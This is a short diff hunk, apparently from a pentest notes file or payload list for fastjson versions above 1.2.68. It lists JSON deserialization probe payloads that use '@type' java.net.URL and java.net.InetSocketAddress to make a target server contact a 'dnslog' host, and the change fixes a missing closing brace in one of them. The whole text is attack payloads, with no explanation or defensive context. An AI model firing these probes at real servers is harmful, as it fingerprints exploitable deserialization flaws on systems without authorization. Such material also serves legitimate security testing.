@@ -31,7 +31,7 @@ fastjson >1.2.68
 Set[{"@type":"java.net.URL","val":"http://dnslog"}]
 Set[{"@type":"java.net.URL","val":"http://dnslog"}
 {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
-{{"@type":"java.net.URL","val":"http://dnslog"}:0
+{{"@type":"java.net.URL","val":"http://dnslog"}:0}
 ```
 
 
